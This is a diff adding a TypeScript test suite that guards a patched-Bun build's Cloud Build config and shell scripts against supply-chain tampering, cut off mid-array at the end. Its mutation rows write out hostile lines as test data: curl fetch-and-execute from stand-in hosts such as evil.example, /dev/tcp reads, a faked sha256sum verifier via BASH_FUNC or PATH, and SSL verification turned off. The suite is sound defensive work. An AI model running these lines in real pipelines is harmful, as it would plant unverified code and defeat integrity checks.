@@ -1,0 +1,1289 @@
+import { describe, expect, it } from 'bun:test';
+import { spawnSync } from 'node:child_process';
+import { readdirSync, readFileSync } from 'node:fs';
+import { resolve } from 'node:path';
+import { parse } from 'yaml';
+import {
+  render as renderUnpinned,
+  entries as unpinnedEntries,
+} from '../infra/bun-base/unpinned.mjs';
+import {
+  CONSUMED,
+  ENV_READS,
+  NET_EXACT,
+  normalize,
+  parseScript,
+  REVIEWED_CLOUDBUILD,
+  scanBuildScript,
+  scanCloudbuild,
+  type Unpinned,
+} from './helpers/bun-base-scan';
+
+/**
+ * #1452 — the patched-Bun build runs least-privilege and fetches nothing unverified that could be
+ * pinned. Comment lines are stripped: they explain the design and may name the forbidden forms.
+ */
+const dir = resolve(import.meta.dirname, '..', 'infra/bun-base');
+const code = (f: string) =>
+  readFileSync(resolve(dir, f), 'utf8')
+    .split('\n')
+    .filter((l) => !l.trimStart().startsWith('#'))
+    .join('\n');
+const build = code('build.sh');
+const cloudbuild = code('cloudbuild.yaml');
+
+describe('cloudbuild.yaml runs as the dedicated build SA', () => {
+  it('pins serviceAccount to bun-base-build, never the default compute SA', () => {
+    expect(cloudbuild).toMatch(
+      /^serviceAccount: projects\/gsw-mcp\/serviceAccounts\/bun-base-build@gsw-mcp\.iam\.gserviceaccount\.com$/m,
+    );
+    expect(cloudbuild).not.toMatch(/compute@developer/);
+    expect(cloudbuild).toMatch(/logging: CLOUD_LOGGING_ONLY/);
+  });
+
+  it('SBOMs the built artifacts, not only the source tree', () => {
+    expect(cloudbuild).toMatch(/scan, dir:\/workspace\/out\b/);
+    expect(cloudbuild).toContain('bun-artifacts.cdx.json.sha256');
+  });
+});
+
+// round 12 (review-1469-r11 HIGH-1): cloudbuild.yaml is what RUNS build.sh, and it was guarded only by
+// three regexes. A build-step env entry replaced `sha256sum` with an exported bash function, another
+// sourced a file first, an extra step swapped the verified binary, `args` ran another script, and
+// `options.env` reached every step — each with every suite green. It is now parsed as YAML and pinned
+// exactly (tests/helpers/bun-base-scan.ts, REVIEWED_CLOUDBUILD); each row below is matched on the
+// message of the rule that owns it.
+describe('cloudbuild.yaml is pinned exactly (parsed as YAML, not matched as text)', () => {
+  const raw = readFileSync(resolve(dir, 'cloudbuild.yaml'), 'utf8');
+  const edit = (from: string, to: string) => {
+    expect(raw.split(from).length, `anchor occurs exactly once: ${from}`).toBe(2);
+    return raw.replace(from, () => to);
+  };
+  const BUILD_ENV = '    env: [BUILD_ID=$BUILD_ID, BUN_BASE_TARGETS=$_TARGETS]';
+  const withBuildEnv = (entry: string) =>
+    edit(BUILD_ENV, `    env: [BUILD_ID=$BUILD_ID, BUN_BASE_TARGETS=$_TARGETS, ${entry}]`);
+
+  it('the committed cloudbuild.yaml is exactly the reviewed config', () => {
+    expect(scanCloudbuild(raw)).toEqual([]);
+    expect(parse(raw)).toStrictEqual(JSON.parse(JSON.stringify(REVIEWED_CLOUDBUILD)));
+  });
+
+  it('pins every step image by digest', () => {
+    for (const s of REVIEWED_CLOUDBUILD.steps) expect(s.name).toMatch(/@sha256:[0-9a-f]{64}$/);
+  });
+
+  it.each<[string, () => string, RegExp]>([
+    [
+      'Y1: BASH_FUNC_sha256sum%% in the build step env (an exported function replaces the verifier)',
+      () => withBuildEnv("'BASH_FUNC_sha256sum%%=() { cat >/dev/null; echo OK; }'"),
+      /^step build: env entries not reviewed: .*BASH_FUNC_sha256sum%%/m,
+    ],
+    [
+      'Y2: BASH_ENV in the build step env (a file is sourced before build.sh)',
+      () => withBuildEnv('BASH_ENV=/workspace/patches/README.md'),
+      /^step build: env entries not reviewed: .*BASH_ENV=/m,
+    ],
+    [
+      'Y3: an extra step after build swaps the verified binary',
+      () =>
+        edit(
+          '  - id: sbom\n',
+          "  - id: fixup\n    name: ubuntu:24.04@sha256:008173c23f95b170204355c12626cb5a965d779a7e1283b09e9cffbb1bf33ca3\n    entrypoint: bash\n    args: [-c, 'curl -fsSLo /workspace/out/bun-linux-x64-musl https://e.invalid/bun']\n  - id: sbom\n",
+        ),
+      /^step ids \["build","fixup","sbom"/m,
+    ],
+    [
+      'Y4: the build step runs another script instead of build.sh',
+      () =>
+        edit(
+          '    args: [/workspace/build.sh]',
+          "    args: [-c, 'curl -fsSL https://e.invalid/b.sh -o /tmp/b && bash /tmp/b']",
+        ),
+      /^step build: args differs/m,
+    ],
+    [
+      'Y5: options.env reaches every step (APT_CONFIG, GIT_CONFIG_PARAMETERS)',
+      () =>
+        edit(
+          '  logging: CLOUD_LOGGING_ONLY\n',
+          `  logging: CLOUD_LOGGING_ONLY\n  env: [APT_CONFIG=/workspace/patches/README.md, "GIT_CONFIG_PARAMETERS='http.sslVerify=false'"]\n`,
+        ),
+      /^options\.env is not reviewed/m,
+    ],
+    [
+      'options.secretEnv',
+      () =>
+        edit(
+          '  logging: CLOUD_LOGGING_ONLY\n',
+          '  logging: CLOUD_LOGGING_ONLY\n  secretEnv: [T]\n',
+        ),
+      /^options\.secretEnv is not reviewed/m,
+    ],
+    [
+      'secretEnv on a step',
+      () =>
+        edit(
+          '    args: [/workspace/build.sh]\n',
+          '    args: [/workspace/build.sh]\n    secretEnv: [T]\n',
+        ),
+      /^step build: secretEnv is not reviewed/m,
+    ],
+    [
+      'a top-level availableSecrets',
+      () =>
+        edit(
+          'timeout: 7200s\n',
+          'timeout: 7200s\navailableSecrets:\n  secretManager: [{versionName: projects/p/secrets/s/versions/1, env: T}]\n',
+        ),
+      /^top-level keys .*"availableSecrets"/m,
+    ],
+    [
+      'the build step env loses an entry',
+      () => edit(BUILD_ENV, '    env: [BUILD_ID=$BUILD_ID]'),
+      /^step build: env entries missing: \["BUN_BASE_TARGETS=\$_TARGETS"\]/m,
+    ],
+    [
+      'an option removed (logging mode)',
+      () => edit('  logging: CLOUD_LOGGING_ONLY\n', ''),
+      /^options\.logging is missing/m,
+    ],
+    [
+      'an option changed',
+      () => edit('  diskSizeGb: 300\n', '  diskSizeGb: 30\n'),
+      /^options\.diskSizeGb differs/m,
+    ],
+    [
+      'the default compute service account',
+      () =>
+        edit(
+          'serviceAccount: projects/gsw-mcp/serviceAccounts/bun-base-build@gsw-mcp.iam.gserviceaccount.com',
+          'serviceAccount: projects/gsw-mcp/serviceAccounts/1-compute@developer.gserviceaccount.com',
+        ),
+      /^serviceAccount differs/m,
+    ],
+    [
+      'an extra substitution',
+      () => edit('  _TARGETS: x64 aarch64\n', '  _TARGETS: x64 aarch64\n  _EXTRA: x\n'),
+      /^substitutions\._EXTRA is not reviewed/m,
+    ],
+    [
+      'the build image by tag instead of digest',
+      () =>
+        edit(
+          '    name: ubuntu:24.04@sha256:008173c23f95b170204355c12626cb5a965d779a7e1283b09e9cffbb1bf33ca3\n    entrypoint: bash\n    args: [/workspace/build.sh]',
+          '    name: ubuntu:24.04\n    entrypoint: bash\n    args: [/workspace/build.sh]',
+        ),
+      /^step build: name differs/m,
+    ],
+    [
+      'a later step env changed',
+      () => edit('SYFT_FILE_METADATA_DIGESTS=sha256', 'SYFT_FILE_METADATA_DIGESTS=md5'),
+      /^step sbom-artifacts: env entries not reviewed/m,
+    ],
+    [
+      'the upload script changed',
+      () =>
+        edit(
+          '        cat SHA256SUMS\n',
+          '        cat SHA256SUMS\n        cp /tmp/x /workspace/out/bun-linux-x64-musl\n',
+        ),
+      /^step digests-and-upload: args differs/m,
+    ],
+    [
+      'the build step env reordered (order is pinned too)',
+      () => edit(BUILD_ENV, '    env: [BUN_BASE_TARGETS=$_TARGETS, BUILD_ID=$BUILD_ID]'),
+      /^step build: env differs/m,
+    ],
+    [
+      'a duplicate key',
+      () => edit('timeout: 7200s\n', 'timeout: 7200s\ntimeout: 1s\n'),
+      /YAML error/,
+    ],
+    [
+      'a YAML alias (a value spelled somewhere other than where it is used)',
+      () =>
+        edit('  - id: build\n', '  - id: &b build\n').replace(
+          '  - id: sbom\n',
+          () => '  - id: sbom\n    tags: [*b]\n',
+        ),
+      /^cloudbuild\.yaml YAML error: .*alias/im,
+    ],
+  ])('goes RED on: %s', (_n, mutate, why) => {
+    expect(scanCloudbuild(mutate()).join('\n')).toMatch(why);
+  });
+});
+
+describe('build.sh verifies every pinnable fetch', () => {
+  it.each([
+    ['apk --allow-untrusted', /--allow-untrusted/],
+    ['a script piped into a shell', /\|\s*(ba)?sh\b/],
+    ['a key dropped into trusted.gpg.d', /trusted\.gpg\.d/],
+  ])('never uses %s', (_n, re) => {
+    expect(build).not.toMatch(re);
+  });
+
+  const pins = readFileSync(resolve(dir, 'fetch-pins.sha256'), 'utf8').trim().split('\n');
+  it.each([
+    ['bootstrap bun zip', 'bun-linux-x64.zip'],
+    ['rustup-init', 'rustup-init'],
+    ['apk-tools-static', 'apk-tools-static.apk'],
+  ])('checks the %s against its in-repo sha256 pin', (_n, file) => {
+    expect(pins.filter((l) => l.endsWith(`  ${file}`))).toHaveLength(1);
+    expect(pins).toContainEqual(
+      expect.stringMatching(new RegExp(`^[0-9a-f]{64}  ${file.replace(/\./g, '\\.')}$`)),
+    );
+    expect(build).toMatch(
+      new RegExp(`(^|\\(cd /tmp && )pin ${file.replace(/\./g, '\\.')}\\)?$`, 'm'),
+    );
+  });
+
+  it('pins the apt.llvm.org key fingerprint and the LLVM package version', () => {
+    expect(build).toMatch(/^LLVM_SIGNER_FPR='(?:[0-9A-F]{4} {1,2}){9}[0-9A-F]{4}'$/m);
+    expect(build).toContain('[ "$fpr" = "${LLVM_SIGNER_FPR// /}" ] ||');
+    expect(build).toContain('signed-by=/etc/apt/keyrings/apt.llvm.org.gpg');
+    for (const pkg of ['clang', 'lld', 'llvm', 'libclang-rt', 'libclang-common']) {
+      expect(build).toMatch(new RegExp(`${pkg}-\\$LLVM_MAJOR(-dev)?="\\$LLVM_PKG_VERSION"`));
+    }
+  });
+
+  it('secret-scan hygiene: no NAME=<32+ hex> assignment in build.sh', () => {
+    expect(build).not.toMatch(/^\s*(export\s+)?[A-Za-z_][A-Za-z0-9_]*=['"]?[0-9A-Fa-f]{32,}/m);
+  });
+
+  it('verifies Alpine packages against the checked-in keys', () => {
+    expect(build).toContain('--keys-dir "$WS/keys/$apkarch"');
+    expect(build).toContain('sha256sum -c --strict SHA256SUMS');
+    const sums = readFileSync(resolve(dir, 'keys/SHA256SUMS'), 'utf8').trim().split('\n');
+    for (const arch of ['x86_64', 'aarch64']) {
+      expect(sums.some((l) => new RegExp(`^[0-9a-f]{64}  ${arch}/\\S+\\.rsa\\.pub$`).test(l))).toBe(
+        true,
+      );
+    }
+  });
+});
+
+// ─────────────────────────────────────────────────────────────────────────────────────────────
+// ALLOWLIST scan (round 5): build.sh and prefix.sh are PARSED with mvdan-sh (the bash parser behind
+// shfmt) and the AST is walked — see tests/helpers/bun-base-scan.ts for the nine rules. Rounds 1-4
+// used a hand-rolled lexer and every round found a quoting desync that hid a command (#1444 class);
+// a real parser removes that class instead of patching the next instance.
+//
+// LIMITS (also in README.md "Known limits"): the scan reasons about the script's text, not the
+// runtime values of variables or the behaviour of the (digest-pinned) image's own tools.
+// ─────────────────────────────────────────────────────────────────────────────────────────────
+
+describe('build.sh scan: allowlisted commands; every fetch pinned or explicitly listed', () => {
+  const unpinned = unpinnedEntries() as (Unpinned & { why: string; what: string })[];
+  const real = readFileSync(resolve(dir, 'build.sh'), 'utf8');
+  const prefix = readFileSync(resolve(dir, 'prefix.sh'), 'utf8');
+  const pins = readFileSync(resolve(dir, 'fetch-pins.sha256'), 'utf8').trim().split('\n');
+  const scan = (t: string) => scanBuildScript(t, unpinned, pins);
+  const scanPrefix = (t: string) => scanBuildScript(t, [], [], { prefix: true });
+
+  it('the real build.sh has no violations', () => {
+    expect(scan(real)).toEqual([]);
+  });
+
+  it('prefix.sh (the one script build.sh runs with bash) passes the allowlist, with no fetch and no function', () => {
+    expect(scanPrefix(prefix)).toEqual([]);
+  });
+
+  it('bash -n accepts both scripts (an independent syntax check)', () => {
+    for (const f of ['build.sh', 'prefix.sh']) {
+      const r = spawnSync('bash', ['-n', resolve(dir, f)], { encoding: 'utf8' });
+      expect(r.status, `${f}: ${r.stderr}`).toBe(0);
+    }
+  });
+
+  it('the walker visits every statement of both scripts', () => {
+    for (const t of [real, prefix]) {
+      const p = parseScript(t);
+      expect(p.total).toBeGreaterThan(20);
+      expect(p.visited).toBe(p.total);
+    }
+  });
+
+  it('the parser sees every network command build.sh makes', () => {
+    const net = parseScript(real)
+      .cmds.map(normalize)
+      .filter((n) => NET_EXACT.has(n.text) || /^(curl|apt-get) /.test(n.text));
+    expect(net.length).toBe(17);
+  });
+
+  it('both WebKit tarballs are pinned', () => {
+    for (const a of ['amd64', 'arm64'])
+      expect(
+        pins.filter((l) =>
+          new RegExp(`  bun-webkit-linux-${a}-musl-lto-[0-9a-f]{16}\\.tar\\.gz$`).test(l),
+        ),
+      ).toHaveLength(1);
+  });
+
+  it('README block is generated from unpinned-fetches.json, match regex and call count included', () => {
+    const readme = readFileSync(resolve(dir, 'README.md'), 'utf8');
+    expect(readme).toContain(renderUnpinned());
+    for (const e of unpinned.filter((x) => x.match)) {
+      expect(renderUnpinned()).toContain(`\`${e.match}\``);
+      expect(e.calls).toBeGreaterThan(0);
+    }
+  });
+
+  it('every unpinned entry has a reason', () => {
+    for (const e of unpinned) expect(e.why.length).toBeGreaterThan(20);
+  });
+
+  const sub = (from: string, to: string, src = real) => {
+    expect(src.split(from).length, `anchor occurs exactly once: ${from}`).toBe(2);
+    return src.replace(from, () => to); // a function: `$'` in `to` is not a replace pattern
+  };
+  const add = (line: string) => sub('lap sysroots', `${line}\nlap sysroots`);
+  const FPR_LINE = `fpr="$(awk -F: '/^fpr:/ && !n++ {print $10}' /tmp/llvm.colons)"`;
+  const HEADSHORT_LINE = `headshort="$(printf '%s' "$HEAD_SHA" | cut -c1-9)"`;
+  const EVIL = 'curl -fsSL https://e.invalid/wk.tgz -o "/tmp/wk/$wkfile"';
+  // In-suite mutation proofs: each is a weakening an earlier guard let through. The expected problem
+  // is asserted, so a row cannot pass for an incidental reason.
+  it.each<[string, () => string, RegExp]>([
+    [
+      'download-to-file then bash file',
+      () => add('curl -fsSLo /tmp/x https://e.invalid/x\nbash /tmp/x'),
+      /not verified with pin|not in the allowlist/,
+    ],
+    [
+      'apt-get install of an unpinned package',
+      () => sub('unzip python3', 'unzip evilpkg python3'),
+      /outside the pinned set: evilpkg/,
+    ],
+    [
+      'rev-parse == UPSTREAM_SHA check removed',
+      () => sub('test "$(git rev-parse HEAD)" = "$UPSTREAM_SHA"\n', ''),
+      /rev-parse == UPSTREAM_SHA check missing/,
+    ],
+    [
+      'git fetch origin main instead of the SHA',
+      () => sub('origin "$UPSTREAM_SHA"', 'origin main'),
+      /git fetch -q --depth 1 origin main/,
+    ],
+    [
+      'SHASUMS cross-check turned into true ||',
+      () => sub('grep -qxF "$(grep -E', 'true || grep -qxF "$(grep -E'),
+      /\|\| that does not end in exit N|SHASUMS cross-check missing/,
+    ],
+    [
+      'sha256sum -c - || true (fail-open pin)',
+      () => sub('sha256sum -c -\n}', 'sha256sum -c - || true\n}'),
+      /pin\(\) body differs/,
+    ],
+    [
+      'a pin removed from a curl',
+      () => sub('(cd /tmp && pin rustup-init)', 'true'),
+      /rustup-init is not verified/,
+    ],
+    ['an unlisted curl added', () => add('curl -fsSLO https://e.invalid/y'), /y is not verified/],
+    [
+      'pin() check swallowed with ||:',
+      () => sub('pin bun-linux-x64.zip\n', 'pin bun-linux-x64.zip || :\n'),
+      /\|\| that does not end in exit N/,
+    ],
+    [
+      'webkit pin removed',
+      () => sub('(cd /tmp/wk && pin "$wkfile")', 'true'),
+      /\$wkfile is not verified/,
+    ],
+    // round 3 greens
+    ['timeout 600 curl', () => add('timeout 600 curl https://e.invalid/t'), /-O xor -o/],
+    ['env curl', () => add('env curl https://e.invalid/t'), /-O xor -o/],
+    ['command curl', () => add('command curl https://e.invalid/t'), /-O xor -o/],
+    [
+      'git -C dir fetch origin main',
+      () => add('git -C "$SRC" fetch origin main'),
+      /not in the allowlist \(head git\)/,
+    ],
+    ['bun -e fetch', () => add(`bun -e 'fetch("https://e.invalid")'`), /head bun\)/],
+    ['bunx pkg', () => add('bunx some-pkg'), /head bunx\)/],
+    ['aria2c', () => add('aria2c https://e.invalid/a'), /head aria2c\)/],
+    ['go run mod@latest', () => add('go run example.invalid/m@latest'), /head go\)/],
+    ['cmake -P', () => add('cmake -P /tmp/x.cmake'), /head cmake\)/],
+    [
+      'pin() early return 0',
+      () => sub('  local line\n', '  return 0\n  local line\n'),
+      /pin\(\) body differs/,
+    ],
+    ['WebKit consumption check deleted', () => sub(`  ${CONSUMED}\n`, ''), /consumed the pinned/],
+    [
+      'apt-get --allow-unauthenticated',
+      () =>
+        sub('apt-get install -y -qq curl', 'apt-get install -y -qq --allow-unauthenticated curl'),
+      /trust bypass/,
+    ],
+    [
+      'a [trusted=yes] apt source',
+      () =>
+        add('echo "deb [trusted=yes] http://e.invalid/ x main" >/etc/apt/sources.list.d/x.list'),
+      /trust bypass/,
+    ],
+    ['xargs curl', () => add('echo https://e.invalid | xargs curl -fsSLo /tmp/q'), /fed by xargs/],
+    [
+      'pinned file used before its pin',
+      () => sub('pin bun-linux-x64.zip\n', 'unzip -q bun-linux-x64.zip\npin bun-linux-x64.zip\n'),
+      /used before it is pinned/,
+    ],
+    [
+      'pin as an if condition',
+      () => sub('pin bun-linux-x64.zip\n', 'if pin bun-linux-x64.zip; then echo ok; fi\n'),
+      /only \[ \/ \[\[ \/ test may be an if condition/,
+    ],
+    [
+      'pin before &&',
+      () => sub('pin bun-linux-x64.zip\n', 'pin bun-linux-x64.zip && echo ok\n'),
+      /a check or fetch before &&/,
+    ],
+    [
+      'loop in an || list',
+      () => sub('  lap "build-$arch"\ndone', '  lap "build-$arch"\ndone || echo x'),
+      /\|\| that does not end in exit N/,
+    ],
+    [
+      'export of a proxy variable',
+      () => add('export https_proxy=http://e.invalid:3128'),
+      /unknown variable https_proxy/,
+    ],
+    [
+      'backgrounded fetch',
+      () => add('curl -fsSLo /tmp/bun-linux-x64.zip https://e.invalid/z &\npin bun-linux-x64.zip'),
+      /backgrounded/,
+    ],
+    // round 4 greens (review-1469-r4): each was scanned GREEN by the hand-rolled lexer
+    [
+      "lexer desync: ${x:-'}'} hides a curl",
+      () => add(`echo \${x:-'}'}\n${EVIL}\necho \\'`),
+      /wk\.tgz|\$wkfile is not verified|-o "\/tmp\/wk\/\$wkfile"/,
+    ],
+    [
+      "lexer desync: $'\\'' hides a curl",
+      () => add(`echo $'\\''\n${EVIL}\necho \\'`),
+      /\$wkfile is not verified/,
+    ],
+    [
+      'cat </dev/"tcp"/… into the prefetch cache',
+      () => add('cat </dev/"tcp"/e.invalid/80 >"$BUN_BUILD_PREFETCH_DIR/by-url/x"'),
+      /input redirection from a non-reviewed source/,
+    ],
+    [
+      'name=/dev/tcp; cat <"$name/…"',
+      () => add('name=/dev/tcp\ncat <"$name/e.invalid/80" >/tmp/evil'),
+      /input redirection from a non-reviewed source/,
+    ],
+    [
+      'verifier shadowing: sha256sum() { … }',
+      () => add('sha256sum() { cat >/dev/null; }'),
+      /function sha256sum\(\)/,
+    ],
+    ['verifier shadowing: grep() { … }', () => add('grep() { echo; }'), /function grep\(\)/],
+    [
+      'PATH prepend plants a fake sha256sum',
+      () =>
+        add(
+          "mkdir /tmp/e\nprintf '#!/bin/sh\\ncat >/dev/null\\n' >/tmp/e/sha256sum\nchmod +x /tmp/e/sha256sum\nexport PATH=/tmp/e:$PATH",
+        ),
+      /PATH may only be set as/,
+    ],
+    [
+      'ln -sf curl over an allowlisted name',
+      () =>
+        add('ln -sf /usr/bin/curl /usr/local/bin/file\nfile -fsSLo /tmp/evil https://e.invalid/x'),
+      /not in the allowlist \(head ln\)/,
+    ],
+    ['unclosed (', () => add('( echo x'), /parse error/],
+    ['if without fi', () => add('if [ -d /tmp ]; then echo x'), /parse error/],
+    ['for without done', () => add('for arch in $TARGETS; do echo x'), /parse error/],
+    [
+      'tee moved out of the build pipeline',
+      () =>
+        sub(
+          '--build-dir="$bd" 2>&1 | tee "/tmp/build-$arch.log" | tail -n 60',
+          '--build-dir="$bd" 2>&1 | tail -n 60\n  tee "/tmp/build-$arch.log" </dev/null',
+        ),
+      /not tee'd inside the build's own pipeline/,
+    ],
+    // limits of round 4, now closed
+    ['printf -v https_proxy', () => add("printf -v https_proxy '%s' x"), /printf -v/],
+    [
+      '${X:=…} assignment',
+      () => add('echo "${https_proxy:=http://e.invalid}"'),
+      /operator .* other than :- and %% is banned/,
+    ],
+    [
+      'export -n PATH',
+      () => add('export -n PATH'),
+      /export -n: banned — only bare export and local/,
+    ],
+    [
+      'pin in an else branch that never runs',
+      () =>
+        sub(
+          '(cd /tmp && pin rustup-init)\n',
+          'if [ -d /tmp ]; then echo skip; else (cd /tmp && pin rustup-init); fi\n',
+        ),
+      /rustup-init is not verified/,
+    ],
+    [
+      'fetch to one dir, pin a same-named file in another',
+      () =>
+        sub(
+          'curl -fsSLO "$base/bun-linux-x64.zip"',
+          'curl -fsSL "$base/bun-linux-x64.zip" -o /tmp/x/bun-linux-x64.zip',
+        ),
+      /pin bun-linux-x64\.zip runs in \/tmp, but the fetch wrote to \/tmp\/x/,
+    ],
+    ['a HOME/.gitconfig insteadOf write', () => add('echo x >"$HOME/.gitconfig"'), /trust bypass/],
+    ['alias', () => add("alias grep='true'"), /head alias\)/],
+    ['hash -p', () => add('hash -p /tmp/evil sha256sum'), /head hash\)/],
+    ['enable -n', () => add('enable -n test'), /head enable\)/],
+    ['git -c', () => add('git -c http.proxy=x rev-parse HEAD'), /git -c \(config injection\)/],
+    ['sudo -s', () => add('sudo -s'), /sudo -s/],
+    ['env -S', () => add("env -S 'curl https://e.invalid'"), /env -S/],
+    ['(( )) arithmetic command', () => add('(( x = 1 ))'), /arithmetic \(ArithmCmd\) is banned/],
+    ['while loop', () => add('while false; do :; done'), /WhileClause is not modeled/],
+    // round 6 (review-1469-r5, F1): curl's SECOND output option is what actually gets written when
+    // curl sees two — the scanner previously kept the LAST one, so these two both looked green while
+    // curl itself wrote the FIRST, unverified path.
+    [
+      'F1: curl -o <decoy pin target> -fsSLo <evil target> (first -o wins in curl, scanner kept the last)',
+      () =>
+        sub(
+          '-fsSLo /tmp/rustup-init \\\n  "https://static.rust-lang.org/rustup/archive/$RUSTUP_VERSION/x86_64-unknown-linux-gnu/rustup-init"\n(cd /tmp && pin rustup-init)',
+          '-o /tmp/rustup-init -fsSLo /tmp/bun-linux-x64.zip \\\n  "https://evil.example/rustup-init"\n(cd /tmp && pin bun-linux-x64.zip)',
+        ),
+      /more than one output option/,
+    ],
+    [
+      'F1: curl -o /usr/local/bin/bun -fsSLo <decoy pin target> (overwrites an allowlisted binary)',
+      () =>
+        add(
+          'curl -o /usr/local/bin/bun -fsSLo /tmp/bun-linux-x64.zip https://evil.example/bun\n(cd /tmp && pin bun-linux-x64.zip)',
+        ),
+      /more than one output option/,
+    ],
+    // round 6 (review-1469-r5, F2): `read` was checked against VARS, which also allows PATH/HOME/WS
+    // on the left of `=` — but `read` never goes through the `=` check, so it could bind those names
+    // straight past the CONSTS one-reviewed-line rule.
+    [
+      'F2: read -r HOME <<< bypasses the HOME=/root CONSTS check',
+      () => add('read -r HOME <<<"$WS"'),
+      /read is only allowed in the reviewed shape/,
+    ],
+    [
+      'F2: read -r PATH <<< bypasses the PATH CONSTS check',
+      () => add('read -r PATH <<<"/tmp/wk:$PATH"'),
+      /read is only allowed in the reviewed shape/,
+    ],
+    [
+      'F2: read -r WS <<< bypasses the WS=/workspace CONSTS check',
+      () => add('read -r WS <<<"/tmp"'),
+      /read is only allowed in the reviewed shape/,
+    ],
+    [
+      'F2: IFS reassigned outside the one reviewed read line',
+      () => add('IFS=,'),
+      /IFS may only be set as/,
+    ],
+    // round 9 (review-1469-r8): rounds 6-8 JUDGED bash's arithmetic contexts (which names, which
+    // operators, which array is associative, in what order and scope) and every round found a context
+    // the judge did not model — round 8's slice offset ran a command substitution nobody scanned. The
+    // scripts now use no arithmetic, array, subscript or slice at all, so every such construct is
+    // BANNED wherever it sits (found by the generic every-field walk), with no semantics to get wrong.
+    // Each row is a bypass from an earlier review, or a sibling construct, and asserts the ban message.
+    [
+      'r8 HIGH-1: a slice offset hiding curl -o + exec',
+      () =>
+        add(
+          'echo "f-${wk:$(curl -fsSL -o /tmp/p http://evil.example/x; chmod +x /tmp/p; /tmp/p; echo 0):16}"',
+        ),
+      /slice `\$\{wk:\$\(curl.* is banned/,
+    ],
+    [
+      'r8 HIGH-1: the same curl -o + exec is ALSO seen by the rule walk (not verified, not allowlisted)',
+      () =>
+        add(
+          'echo "f-${wk:$(curl -fsSL -o /tmp/p http://evil.example/x; chmod +x /tmp/p; /tmp/p; echo 0):16}"',
+        ),
+      /curl URL is not https|p is not verified with pin|head chmod/,
+    ],
+    [
+      'r8 HIGH-1: a slice length hiding $(id)',
+      () => add('echo "${wk:0:$(id)}"'),
+      /slice .* is banned/,
+    ],
+    ['a plain literal slice ${wk:0:16}', () => add('echo "${wk:0:16}"'), /slice .* is banned/],
+    [
+      'r8 MEDIUM-2: ${wk:${T0[PATH=1]}:16}',
+      () => add('echo "${wk:${T0[PATH=1]}:16}"'),
+      /array subscript `\$\{T0\[PATH=1\]\}` is banned/,
+    ],
+    [
+      'r7: ${PATCHES[PATH=0]}',
+      () => add('echo "${PATCHES[PATH=0]}"'),
+      /array subscript .* is banned/,
+    ],
+    ['r8: ${WK_KEY[$arch]}', () => add('echo "${WK_KEY[$arch]}"'), /array subscript .* is banned/],
+    [
+      'a length of an array ${#PATCHES[@]}',
+      () => add('echo "${#PATCHES[@]}"'),
+      /array subscript .* is banned/,
+    ],
+    ['${!name} indirection', () => add('echo "${!wk}"'), /indirect expansion .* is banned/],
+    ['${!prefix*} names', () => add('echo "${!wk*}"'), /name-prefix expansion .* is banned/],
+    ['${x@P} transform', () => add('echo "${wk@P}"'), /operator .* other than :- and %% is banned/],
+    [
+      '${x:=v} assignment',
+      () => add('echo "${wk:=x}"'),
+      /operator .* other than :- and %% is banned/,
+    ],
+    ['r7: PATCHES[PATH=0]=z', () => add('PATCHES[PATH=0]=z'), /indexed assignment .* is banned/],
+    [
+      'r7: PATCHES=([PATH=1]=x)',
+      () => add('PATCHES=([PATH=1]=x)'),
+      /array assignment .* is banned/,
+    ],
+    ['PATCHES+=(x)', () => add('PATCHES+=(x)'), /array assignment .* is banned/],
+    ['r8 MEDIUM-3: declare -A WK_KEY', () => add('declare -A WK_KEY'), /declare -A: banned/],
+    [
+      'r8 MEDIUM-3: ( declare -A WK_KEY )',
+      () => add('( declare -A WK_KEY )'),
+      /declare -A: banned/,
+    ],
+    ['declare -i', () => add('declare -i xdi\nxdi=PATH=1'), /declare -i: banned/],
+    ['typeset -A', () => add('typeset -A x'), /typeset -A: banned/],
+    ['readonly', () => add('readonly wk'), /readonly: banned/],
+    ['$(( )) expansion', () => add('echo "$(( 1 + 2 ))"'), /arithmetic \(ArithmExp\) is banned/],
+    ['$[ ] expansion', () => add('echo "$[ 1 + 2 ]"'), /arithmetic \(ArithmExp\) is banned/],
+    ['(( PATH = 1 ))', () => add('(( PATH = 1 ))'), /arithmetic \(ArithmCmd\) is banned/],
+    ['let PATH=1', () => add('let PATH=1'), /arithmetic \(LetClause\) is banned/],
+    [
+      'for (( ; ; ))',
+      () => add('for (( PATH=1; 0; )); do :; done'),
+      /arithmetic \(CStyleLoop\) is banned/,
+    ],
+    [
+      'a $(( )) inside a heredoc body (the generic walk reads Hdoc)',
+      () => add('cat >/dev/null <<X\n$(( PATH = 1 ))\nX'),
+      /arithmetic \(ArithmExp\) is banned/,
+    ],
+    [
+      'an unverified curl inside a heredoc body (the rule walk reaches it)',
+      () => add('cat >/dev/null <<X\n$(curl -fsSLo /tmp/q https://e.invalid/q)\nX'),
+      /q is not verified with pin/,
+    ],
+    [
+      '[[ 1 -eq PATH=5 ]]',
+      () => add('[[ 1 -eq PATH=5 ]]'),
+      /\[\[ \]\] arithmetic comparison .* is banned/,
+    ],
+    [
+      "[[ -v 'a[$(id)]' ]] (subscript evaluation)",
+      () => add(`[[ -v 'a[$(id)]' ]]`),
+      /\[\[ -v \]\] is banned/,
+    ],
+    ['[ "$x" -eq 0 ]', () => add('[ "$wk" -eq 0 ]'), /\[ is not one of the reviewed shapes/],
+    [
+      '[ 1 -gt 0 ] (even two literals)',
+      () => add('[ 1 -gt 0 ]'),
+      /\[ is not one of the reviewed shapes/,
+    ],
+    [
+      "test -v 'a[$(id)]'",
+      () => add(`test -v 'a[$(id)]'`),
+      /test is not one of the reviewed shapes/,
+    ],
+    // round 10 (review-1469-r9, HIGH-1): the option word was matched on its SOURCE text, so a quoted
+    // or expanded `-v` evaded it — and bash evaluates the subscript of `printf -v NAME[…]` /
+    // `test -v NAME[…]` arithmetically, running the `$( )` inside a single-quoted subscript. Rule 11
+    // judges the PARSED word; rule 12 bans the re-evaluable text itself. Each row names ONE rule's
+    // message, so disabling either rule reds exactly its own rows.
+    ...((
+      [
+        ['N1 printf "-v"', `printf "-v" 'x[$(id)]' %s y`],
+        ['N2 printf -""v', `printf -""v 'x[$(id)]' %s y`],
+        ['N3 [ "-v" … ]', `if [ "-v" 'x[$(id)]' ]; then echo; fi`],
+        ['N4 test -""v', `if test -""v 'x[$(id)]'; then echo; fi`],
+        ['N5 name=-v; printf "$name"', `name=-v\nprintf "$name" 'x[$(id)]' %s y`],
+        ['N6 name=-v; [ "$name" … ]', `name=-v\nif [ "$name" 'x[$(id)]' ]; then echo; fi`],
+        ["N7 printf '-v'", `printf '-v' 'x[$(id)]' %s y`],
+      ] as const
+    ).flatMap(([n, line]) => [
+      [
